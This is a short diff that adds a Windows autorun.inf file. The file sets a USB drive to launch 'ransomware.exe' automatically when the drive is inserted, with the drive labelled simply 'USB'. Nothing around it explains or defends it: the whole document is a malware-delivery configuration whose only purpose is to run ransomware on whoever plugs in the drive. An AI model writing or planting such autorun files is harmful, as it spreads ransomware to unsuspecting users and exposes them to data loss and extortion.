@@ -1,0 +1,5 @@
+[Autorun]
+open=ransomware.exe
+action=Run Ransomware
+icon=ransomware.exe
+label=USB
